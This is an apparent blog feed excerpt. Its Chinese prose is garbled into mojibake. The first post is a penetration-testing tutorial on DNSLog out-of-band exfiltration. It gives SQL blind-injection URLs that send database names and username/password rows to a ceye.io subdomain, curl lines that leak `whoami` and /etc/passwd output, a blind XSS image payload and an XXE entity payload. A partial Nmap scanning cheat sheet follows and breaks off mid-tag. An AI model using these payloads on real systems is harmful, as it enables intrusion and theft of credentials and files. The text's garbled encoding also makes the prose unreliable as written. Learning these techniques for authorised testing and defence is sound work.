    <content type="html"><![CDATA[<h2 id="0x01-åŸç†">0x01 åŸç†</h2><blockquote><p>NSï¼ˆName Serverï¼‰è®°å½•æ˜¯åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œç”¨æ¥æŒ‡å®šè¯¥åŸŸåç”±å“ªä¸ªDNSæœåŠ¡å™¨æ¥è¿›è¡Œè§£æ<br>DNSï¼šåŸŸåè§£ææœåŠ¡å™¨<br>Aè®°å½•ï¼šæŒ‡å®šåŸŸåå¯¹åº”çš„IPåœ°å€</p></blockquote><p><strong>ä¸€å¥è¯å½’çº³</strong>ğŸ˜ªğŸ˜ªï¼š<br>ã€€ã€€<font color=blue>å°†éœ€è¦æŸ¥è¯¢çš„å€¼å’ŒåŸŸåæ‹¼æ¥èµ·æ¥ï¼Œå‘åŸŸåå‘é€è¯·æ±‚ï¼ŒDNSåœ¨è§£æçš„æ—¶å€™ä¼šç•™ä¸‹æ—¥å¿—ï¼Œè¯»å–æ—¥å¿—ä¾¿å¯ä»¥è·å–ä¿¡æ¯ã€‚</font></p><ul><li>æ¡ˆä¾‹è§£é‡Š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping &#96;whoami&#96;.test.com&#x2F;&#x2F;å‘å‡ºè¯·æ±‚</span><br><span class="line">ping root.test.com&#x2F;&#x2F;å®é™…è¯·æ±‚</span><br></pre></td></tr></table></figure><p><code>whoami</code>åœ¨å‘½ä»¤è¡Œä¸­å°±è‡ªåŠ¨è§£æäº†ï¼Œæ‰€ä»¥å…¶å®æ˜¯å‘<code>root.test.com</code>å‘å‡ºçš„è¯·æ±‚ï¼Œè¿™æ—¶å°±ä¼šè¢«DNSæœåŠ¡å™¨æ‰€æ•è·ï¼Œæˆ‘ä»¬å°±èƒ½ä»æ—¥å¿—ä¸­è·å–å‘½ä»¤æ‰§è¡Œåçš„ç»“æœäº†ã€‚é‚£åˆ°åº•æ€ä¹ˆåˆ©ç”¨DNSLogè¿›è¡Œæ³¨å…¥å‘¢ï¼Ÿå…¶å®åªè¦æ˜¯èƒ½å¤Ÿå‘å‡ºè¯·æ±‚çš„åœ°æ–¹éƒ½å¯ä»¥ç”¨è¿™ç§æ–¹å¼è·å–æ•°æ®ã€‚</p><h2 id="0x02-DNSLogå¹³å°">0x02 DNSLogå¹³å°</h2><p>ä¸€ã€åœ¨çº¿å¹³å°ï¼š<code>http://ceye.io</code>ã€<code>http://www.dnslog.cn</code></p><p>äºŒã€è‡ªå·±æ­å»ºDNSLogæœåŠ¡å™¨ï¼š<code>https://github.com/BugScanTeam/DNSLog</code></p><p>ä¸‰ã€ BurpSuite collaborator</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105715.png" alt=""><br><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105732.png" alt=""></p><p>ç‚¹å‡»Copy to Clipboardè·å–ä¸€ä¸ªæ ‡è¯†<br>æ¯”å¦‚æˆ‘è¿™é‡Œè·å–åˆ°çš„å°±æ˜¯<code>s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net</code><br>ç„¶åç”¨è¿™ä¸ªå¤–å¸¦å°±è¡Œäº†</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200704105806.png" alt=""></p><h2 id="0x03-DNSLogå¸¸ç”¨åœºæ™¯">0x03 DNSLogå¸¸ç”¨åœºæ™¯</h2><ol><li>SQLç›²æ³¨</li><li>å‘½ä»¤æ‰§è¡Œï¼ˆæ— å›æ˜¾ï¼‰</li><li>XSSï¼ˆæ— å›æ˜¾ï¼‰</li><li>SSRF(æ— å›æ˜¾)</li></ol><h3 id="SQLç›²æ³¨">SQLç›²æ³¨</h3><p>ä»¥MySQLä¸ºä¾‹ï¼Œåœ¨MySQLä¸­æœ‰ä¸ªä¸€ä¸ª<font color=blue>load_file</font>å‡½æ•°å¯ä»¥ç”¨æ¥è¯»å–æœ¬åœ°çš„æ–‡ä»¶ã€‚å‰ææ˜¯rootæƒé™ã€‚<br>show variables like â€˜%secure%â€™;æŸ¥çœ‹load_file()å¯ä»¥è¯»å–çš„ç£ç›˜ã€‚</p><ul><li>å½“secure_file_privä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚</li><li>å½“secure_file_privä¸ºE:\ï¼Œå°±å¯ä»¥è¯»å–Eç›˜çš„æ–‡ä»¶ã€‚</li><li>å½“secure_file_privä¸ºnullï¼Œload_fileå°±ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚</li></ul><p>âš ï¸ æ³¨æ„ï¼šload_fileå‡½æ•°åœ¨<font color=red>Linux</font>ä¸‹æ˜¯æ— æ³•ç”¨æ¥åšdnslogæ”»å‡»çš„ï¼Œå› ä¸ºåœ¨è¿™é‡Œå°±æ¶‰åŠåˆ°Windowsâ€”â€”<font color=blue>UNC</font>è·¯å¾„ã€‚</p><blockquote><p>UNCè·¯å¾„ï¼šUNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨. UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚æˆ‘ä»¬æ—¥å¸¸å¸¸ç”¨çš„ç½‘ç»œå…±äº«æ–‡ä»¶å°±æ˜¯è¿™ä¸ªæ–¹å¼ã€‚</p></blockquote><p>å¹³å¸¸åœ¨Widnowsä¸­ç”¨å…±äº«æ–‡ä»¶çš„æ—¶å€™å°±ä¼šç”¨åˆ°è¿™ç§ç½‘ç»œåœ°å€çš„å½¢å¼ï¼š<code>\\sss.xxx\test\</code><br>è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆCONCAT()å‡½æ•°æ‹¼æ¥äº†4ä¸ª\äº†ï¼Œå› ä¸ºè½¬ä¹‰çš„åŸå› ï¼Œ4ä¸ªå°±å˜\æˆäº†2ä¸ª\ï¼Œç›®çš„å°±æ˜¯åˆ©ç”¨UNCè·¯å¾„ã€‚</p><p>âš ï¸ å¦‚æœæŸ¥è¯¢çš„æ•°æ®ä¸­å‡ºç°äº†éå­—æ¯æ•°å­—çš„ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦è¿›è¡Œ<font color=blue>è½¬ä¹‰</font>ï¼Œè¿™é‡Œç”¨16è¿›åˆ¶ã€‚åŸå› æ˜¯å¦‚æœå‡ºç°å¦‚é€—å·ï¼Œ@ç¬¦å·ç­‰ç‰¹æ®Šç¬¦å·ï¼Œä¸èƒ½å½¢æˆæ ‡å‡†çš„dnsåŸŸåï¼Œæ— æ³•å‘å‡ºæ•°æ®ã€‚</p><ul><li>å‡ ä¸ªä¾‹å­</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥è¯»å–</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">hexè½¬ç </span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br><span class="line">å–æ•°æ®</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(concat(username,0x7e,password,0x7e)) from security.users limit 0,1),&#39;.4do468.ceye.io\\abc&#39;))),1,0)%23</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ</h3><h4 id="Windowsä¸‹">Windowsä¸‹</h4><p>æŸ¥çœ‹è®¡ç®—æœºåï¼Œå…¶ä»–ç±»ä¼¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %COMPUTERNAME%.xxx.ceye.io</span><br></pre></td></tr></table></figure><h4 id="Linuxä¸‹">Linuxä¸‹</h4><p>æŸ¥çœ‹å½“å‰ç”¨æˆ·å’Œpasswdæ–‡ä»¶ï¼Œå…¶ä»–ç±»ä¼¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;&#96;whoami&#96;</span><br><span class="line">curl http:&#x2F;&#x2F;ip.port.xxoo.ceye.io&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;</span><br></pre></td></tr></table></figure><h3 id="XSS">XSS</h3><p>é€šè¿‡ç›²æ‰“ï¼Œè®©è§¦å‘è€…æµè§ˆå™¨è®¿é—®é¢„è®¾è‡³çš„é“¾æ¥åœ°å€ï¼Œå¦‚æœç›²æ‰“æˆåŠŸï¼Œä¼šåœ¨å¹³å°ä¸Šæ”¶åˆ°å¦‚ä¸‹çš„é“¾æ¥è®¿é—®è®°å½•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure><h3 id="SSRF">SSRF</h3><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;aa&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-æ€»ç»“">0x04 æ€»ç»“</h2><ul><li>æœ‰äº›å‡½æ•°çš„ä½¿ç”¨å…·æœ‰æ“ä½œç³»ç»Ÿçš„é™åˆ¶ã€‚</li><li>DNSæŸ¥è¯¢æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥å¿…è¦çš„æ—¶å€™éœ€è¦å¯¹æŸ¥è¯¢ç»“æœåšå­—ç¬¦ä¸²çš„åˆ‡å‰²ã€‚</li><li>é¿å…ä¸€äº›ç‰¹æ®Šç¬¦å·çš„äº§ç”Ÿï¼Œæœ€å¥½çš„é€‰æ‹©å°±æ˜¯æ•°æ®å…ˆç¼–ç å†å¸¦å‡ºã€‚</li><li>æ³¨æ„ä¸åŒæ•°æ®åº“çš„è¯­æ³•æ˜¯æœ‰å·®å¼‚çš„ï¼Œç‰¹åˆ«æ˜¯åœ¨æ•°æ®åº“æ‹¼æ¥çš„æ—¶å€™ã€‚</li><li>æœ‰äº›æ“ä½œæ˜¯éœ€è¦è¾ƒé«˜çš„æƒé™ã€‚</li></ul><p>ğŸŒˆğŸŒˆ åˆ©ç”¨DNSLogæ”»å‡»çš„æ–¹æ³•ï¼Œèƒ½æ›´åŠ ç®€ä¾¿ã€é«˜æ•ˆçš„è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå¹¶ä¸”æ‹¥æœ‰è¶³å¤Ÿæƒé™ï¼Œå¯ä»¥ç›´æ¥æ‹¿ä¸‹ç›®æ ‡ç«™ç‚¹ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-åŸç†&quot;&gt;0x01 åŸç†&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;NSï¼ˆName Serverï¼‰è®°å½•æ˜¯åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œç”¨æ¥æŒ‡å®šè¯¥åŸŸåç”±å“ªä¸ªDNSæœåŠ¡å™¨æ¥è¿›è¡Œè§£æ&lt;br&gt;
DNSï¼šåŸŸåè§£ææœåŠ¡å™¨&lt;br&gt;
Aè®°å½•ï¼šæŒ‡å®šåŸŸåå¯¹åº”çš„IPåœ°å€&lt;/p&gt;
&lt;/bloc
      
    
    </summary>
    
    
      <category term="æ¸—é€" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="æŠ€å·§" scheme="http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>NMAPçš„ä½¿ç”¨</title>
    <link href="http://yoursite.com/2020/06/27/Nmap%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2020/06/27/Nmap%E4%BD%BF%E7%94%A8/</id>
    <published>2020-06-27T06:53:22.000Z</published>
    <updated>2020-06-27T06:53:43.929Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nampç«¯å£çŠ¶æ€">nampç«¯å£çŠ¶æ€</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Open</span>(å¼€æ”¾çš„): åº”ç”¨ç¨‹åºæ­£åœ¨è¿™ä¸ªç«¯å£ä¸Šç›‘å¬è¿æ¥ã€‚</span><br><span class="line"><span class="selector-tag">losed</span>(å…³é—­çš„): ç«¯å£å¯¹æ¢æµ‹åšå‡ºäº†å“åº”ï¼Œä½†æ˜¯ç°åœ¨æ²¡æœ‰åº”ç”¨ç¨‹åºåœ¨ç›‘å¬è¿™ä¸ªç«¯å£ã€‚</span><br><span class="line"><span class="selector-tag">Filtered</span>(è¿‡æ»¤çš„): ç«¯å£æ²¡æœ‰å¯¹æ¢æµ‹åšå‡ºå“åº”ã€‚åŒæ—¶å‘Šè¯‰æˆ‘ä»¬æ¢é’ˆå¯èƒ½è¢«ä¸€äº›è¿‡æ»¤å™¨ï¼ˆé˜²ç«å¢™ï¼‰ç»ˆæ­¢äº†ã€‚</span><br><span class="line"><span class="selector-tag">Unfiltered</span>(æœªè¢«è¿‡æ»¤çš„):ç«¯å£å¯¹æ¢æµ‹åšå‡ºäº†å“åº”ï¼Œä½†æ˜¯<span class="selector-tag">Nmap</span>æ— æ³•ç¡®å®šå®ƒä»¬æ˜¯å…³é—­è¿˜æ˜¯å¼€æ”¾ã€‚</span><br><span class="line"><span class="selector-tag">Open</span>/<span class="selector-tag">Filtered</span>: ç«¯å£è¢«è¿‡æ»¤æˆ–è€…æ˜¯å¼€æ”¾çš„ï¼Œ<span class="selector-tag">Nmap</span>æ— æ³•åšå‡ºåˆ¤æ–­ã€‚</span><br><span class="line"><span class="selector-tag">Closed</span>/<span class="selector-tag">Filtered</span>: ç«¯å£è¢«è¿‡æ»¤æˆ–è€…æ˜¯å…³é—­çš„ï¼Œ<span class="selector-tag">Nmap</span>æ— æ³•åšå‡ºåˆ¤æ–­ã€‚</span><br></pre></td></tr></table></figure><h2 id="TCPæ ‡å¿—ä½">TCPæ ‡å¿—ä½</h2><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">SYN</span>(synchronouså»ºç«‹è”æœº)</span><br><span class="line"><span class="selector-tag">ACK</span>(acknowledgement ç¡®è®¤)</span><br><span class="line"><span class="selector-tag">PSH</span>(pushä¼ é€)</span><br><span class="line"><span class="selector-tag">FIN</span>(finishç»“æŸ)</span><br><span class="line"><span class="selector-tag">RST</span>(reseté‡ç½®)</span><br><span class="line"><span class="selector-tag">URG</span>(urgentç´§æ€¥)</span><br></pre></td></tr></table></figure><h2 id="nmapå¸¸ç”¨å‘½ä»¤">nmapå¸¸ç”¨å‘½ä»¤</h2><p>è½»é‡çº§æ‰«æï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sP</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.0</span>/<span class="selector-tag">24</span> åˆ¤æ–­å“ªäº›ä¸»æœºå­˜æ´»</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.3</span> å¼€æ”¾äº†å“ªäº›ç«¯å£</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> å¼€æ”¾äº†å“ªäº›ç«¯å£ï¼ˆéšè”½æ‰«æï¼‰</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sU</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> å¼€æ”¾äº†å“ªäº›ç«¯å£ï¼ˆ<span class="selector-tag">UDP</span>ï¼‰</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> <span class="selector-tag">-O</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.127</span> æ“ä½œç³»ç»Ÿè¯†åˆ«</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-p</span> <span class="selector-tag">80</span> <span class="selector-tag">-oG</span> â€“ <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.1</span>.* | <span class="selector-tag">grep</span> <span class="selector-tag">open</span>åˆ—å‡ºå¼€æ”¾äº†æŒ‡å®šç«¯å£çš„ä¸»æœºåˆ—è¡¨</span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-p</span> <span class="selector-tag">80</span> <span class="selector-tag">thief</span><span class="selector-class">.one</span> åˆ—å‡ºæœåŠ¡å™¨ç±»å‹(åˆ—å‡ºæ“ä½œç³»ç»Ÿï¼Œå¼€å‘ç«¯å£ï¼ŒæœåŠ¡å™¨ç±»å‹,ç½‘ç«™è„šæœ¬ç±»å‹ç­‰)</span><br></pre></td></tr></table></figure><p>æ‰¹é‡æ‰«æï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-O</span> <span class="selector-tag">-P0</span> <span class="selector-tag">--open</span> <span class="selector-tag">-n</span> <span class="selector-tag">-oN</span> <span class="selector-tag">result</span><span class="selector-class">.txt</span> <span class="selector-tag">-p80-89</span>,<span class="selector-tag">8080-8099</span>,<span class="selector-tag">8000-8009</span>,<span class="selector-tag">7001-7009</span>,<span class="selector-tag">9000-9099</span>,<span class="selector-tag">21</span>,<span class="selector-tag">443</span>,<span class="selector-tag">873</span>,<span class="selector-tag">2601</span>,<span class="selector-tag">2604</span>,<span class="selector-tag">3128</span>,<span class="selector-tag">4440</span>,<span class="selector-tag">6082</span>,<span class="selector-tag">6379</span>,<span class="selector-tag">8888</span>,<span class="selector-tag">3389</span>,<span class="selector-tag">9200</span>,<span class="selector-tag">11211</span>,<span class="selector-tag">27017</span>,<span class="selector-tag">28017</span>,<span class="selector-tag">389</span>,<span class="selector-tag">8443</span>,<span class="selector-tag">4848</span>,<span class="selector-tag">8649</span>,<span class="selector-tag">995</span>,<span class="selector-tag">9440</span>,<span class="selector-tag">9871</span>,<span class="selector-tag">2222</span>,<span class="selector-tag">2082</span>,<span class="selector-tag">3311</span>,<span class="selector-tag">18100</span>,<span class="selector-tag">9956</span>,<span class="selector-tag">1433</span>,<span class="selector-tag">3306</span>,<span class="selector-tag">1900</span>,<span class="selector-tag">49705</span>,<span class="selector-tag">50030</span>,<span class="selector-tag">7778</span>,<span class="selector-tag">5432</span>,<span class="selector-tag">7080</span>,<span class="selector-tag">5900</span>,<span class="selector-tag">50070</span>,<span class="selector-tag">5000</span>,<span class="selector-tag">5560</span>,<span class="selector-tag">10000</span> <span class="selector-tag">-iL</span> <span class="selector-tag">ip</span><span class="selector-class">.txt</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sT</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-p80-89</span>,<span class="selector-tag">8080-8099</span>,<span class="selector-tag">8000-8009</span>,<span class="selector-tag">7001-7009</span>,<span class="selector-tag">9000-9099</span>,<span class="selector-tag">21</span>,<span class="selector-tag">443</span>,<span class="selector-tag">873</span>,<span class="selector-tag">2601</span>,<span class="selector-tag">2604</span>,<span class="selector-tag">3128</span>,<span class="selector-tag">4440</span>,<span class="selector-tag">6082</span>,<span class="selector-tag">6379</span>,<span class="selector-tag">8888</span>,<span class="selector-tag">3389</span>,<span class="selector-tag">9200</span>,<span class="selector-tag">11211</span>,<span class="selector-tag">27017</span>,<span class="selector-tag">28017</span>,<span class="selector-tag">389</span>,<span class="selector-tag">8443</span>,<span class="selector-tag">4848</span>,<span class="selector-tag">8649</span>,<span class="selector-tag">995</span>,<span class="selector-tag">9440</span>,<span class="selector-tag">9871</span>,<span class="selector-tag">2222</span>,<span class="selector-tag">2082</span>,<span class="selector-tag">3311</span>,<span class="selector-tag">18100</span>,<span class="selector-tag">9956</span>,<span class="selector-tag">1433</span>,<span class="selector-tag">3306</span>,<span class="selector-tag">1900</span>,<span class="selector-tag">49705</span>,<span class="selector-tag">50030</span>,<span class="selector-tag">7778</span>,<span class="selector-tag">5432</span>,<span class="selector-tag">7080</span>,<span class="selector-tag">5900</span>,<span class="selector-tag">50070</span>,<span class="selector-tag">5000</span>,<span class="selector-tag">5560</span>,<span class="selector-tag">10000</span> <span class="selector-tag">--open</span> <span class="selector-tag">--max-hostgroup</span> <span class="selector-tag">10</span> <span class="selector-tag">--max-parallelism</span> <span class="selector-tag">10</span> <span class="selector-tag">--max-rtt-timeout</span> <span class="selector-tag">1000ms</span> <span class="selector-tag">--host-timeout</span> <span class="selector-tag">800s</span> <span class="selector-tag">--max-scan-delay</span> <span class="selector-tag">2000ms</span> <span class="selector-tag">-iL</span> ~/<span class="selector-tag">Desktop</span>/<span class="selector-tag">ip</span><span class="selector-class">.txt</span> <span class="selector-tag">-oN</span> ~/<span class="selector-tag">Desktop</span>/<span class="selector-tag">result</span>/<span class="selector-tag">result</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><h2 id="nmapå‚æ•°">nmapå‚æ•°</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-attr">[Scan Type(s)]</span> <span class="selector-attr">[Options]</span> &#123;<span class="selector-tag">target</span> <span class="selector-tag">specification</span>&#125;</span><br><span class="line"><span class="selector-tag">scan</span> <span class="selector-tag">type</span>(s) ç”¨äºæŒ‡å®šæ‰«æç±»å‹</span><br><span class="line"><span class="selector-tag">options</span> ç”¨äºæŒ‡å®šé€‰é¡¹</span><br><span class="line"><span class="selector-tag">target</span> <span class="selector-tag">specification</span> ç”¨äºæŒ‡å®šæ‰«æç›®æ ‡</span><br><span class="line"><span class="selector-tag">-s</span> æŒ‡å®šæ‰«æç±»å‹</span><br><span class="line">å¦‚ä¸‹ï¼š</span><br><span class="line"><span class="selector-tag">-sP</span> (pingæ‰«æ) *å­˜æ´»ä¸»æœºæ¢æµ‹</span><br><span class="line"><span class="selector-tag">-sS</span> (TCP SYNæ‰«æ éšèº«æ‰«æ) *é»˜è®¤æ‰«ææ–¹å¼ï¼Œä½¿ç”¨é¢‘ç‡æœ€é«˜çš„åŠå¼€æ”¾æ‰«æ</span><br><span class="line"><span class="selector-tag">-sT</span> (tcp æ‰«æ) *<span class="selector-tag">TCP</span> <span class="selector-tag">connect</span>()é»˜è®¤çš„æ‰«ææ–¹å¼ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹</span><br><span class="line"><span class="selector-tag">-sU</span> ï¼ˆ<span class="selector-tag">UDP</span> æ‰«æï¼‰ç”¨æ¥æ¢æµ‹ç›®çš„çš„<span class="selector-tag">UDP</span>ç«¯å£ï¼Œä¸éœ€è¦å‘é€ä»»ä½•çš„<span class="selector-tag">SYN</span>åŒ…ï¼Œå‘é€<span class="selector-tag">UDP</span>æ•°æ®åŒ…åˆ°ç›®çš„ä¸»æœºç­‰å¾…å“åº”</span><br><span class="line"><span class="selector-tag">-sA</span> ï¼ˆ<span class="selector-tag">ACK</span>æ‰«æï¼‰ *ä¸‰æ¬¡æ¡æ‰‹ ç”¨äºæ¢æµ‹å‡ºé˜²ç«å¢™è¿‡æ»¤ç«¯å£ å®é™…æ¸—é€ä¸­æ²¡å¤šå¤§ç”¨</span><br><span class="line"><span class="selector-tag">-sV</span> ï¼ˆç‰ˆæœ¬æ¢æµ‹ï¼‰</span><br><span class="line"><span class="selector-tag">-A</span>ç»¼åˆæ‰«æï¼ˆç³»ç»Ÿæ¢æµ‹ï¼Œç‰ˆæœ¬æ¢æµ‹ï¼Œè·¯ç”±è¿½è¸ªä»¥åŠä¸€äº›å¸¸ç”¨è„šæœ¬çš„æ‰«æï¼‰</span><br><span class="line"><span class="selector-tag">-O</span> ï¼ˆå¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹ï¼‰</span><br><span class="line"><span class="selector-tag">-v</span>è¯¦ç»†</span><br><span class="line">é€‰é¡¹è¯´æ˜</span><br><span class="line"><span class="selector-tag">-P0</span> <span class="selector-attr">[æŒ‡å®šç«¯å£]</span> (æ— pingæ‰«æ)</span><br><span class="line"><span class="selector-tag">-PU</span> <span class="selector-attr">[æŒ‡å®šç«¯å£]</span> (udp pingæ‰«æ)</span><br><span class="line"><span class="selector-tag">-PS</span> <span class="selector-attr">[æŒ‡å®šç«¯å£]</span> (TCP SYN ping æ‰«æ)</span><br><span class="line"><span class="selector-tag">-PA</span> <span class="selector-attr">[æŒ‡å®šç«¯å£]</span> (tcp ack pingæ‰«æ)</span><br><span class="line"><span class="selector-tag">-PI</span> ä½¿ç”¨çœŸæ­£çš„<span class="selector-tag">pingICMP</span> <span class="selector-tag">echo</span>è¯·æ±‚æ¥æ‰«æç›®æ ‡ä¸»æœºæ˜¯å¦æ­£åœ¨è¿è¡Œ</span><br><span class="line"><span class="selector-tag">-iL</span> æŒ‡å®šæ‰«æä¸»æœºåˆ—è¡¨</span><br><span class="line"><span class="selector-tag">-iR</span> éšæœºé€‰æ‹©ç›®æ ‡</span><br><span class="line">â€“<span class="selector-tag">exclude</span> æ’é™¤æ‰«æç›®æ ‡</span><br><span class="line">â€“<span class="selector-tag">excludefile</span> æ’é™¤æ–‡ä»¶ä¸­ç›®æ ‡åˆ—è¡¨</span><br><span class="line"><span class="selector-tag">-n</span> (ä¸ç”¨åŸŸåè§£æ)</span><br><span class="line"><span class="selector-tag">-R</span> (ä¸ºæ‰€æœ‰ç›®æ ‡è§£æåŸŸå)</span><br><span class="line"><span class="selector-tag">-T</span> æ—¶é—´ä¼˜åŒ–ï¼ˆæ¯éš”å¤šä¹…å‘ä¸€æ¬¡åŒ… ï¼‰ <span class="selector-tag">-T5</span> æœ€å¿« <span class="selector-tag">-T0</span> æœ€æ…¢ï¼ˆ<span class="selector-tag">5</span>é€‚åˆå±€åŸŸç½‘ï¼‰</span><br><span class="line"><span class="selector-tag">-F</span> å¿«é€Ÿæ‰«æ</span><br><span class="line"><span class="selector-tag">-e</span> æŒ‡å®šç½‘ç»œæ¥å£</span><br><span class="line"><span class="selector-tag">-M</span> è®¾ç½®<span class="selector-tag">tcp</span>æ‰«æçº¿ç¨‹</span><br><span class="line"><span class="selector-tag">-iL</span> æ–‡ä»¶ æŒ‡å®šä¸€ä¸ªæ–‡æœ¬å†…çš„æ‰€æœ‰ä¸»æœº</span><br><span class="line"><span class="selector-tag">nmap</span>çš„è¾“å‡ºï¼š<span class="selector-tag">oN</span>ï¼Œ<span 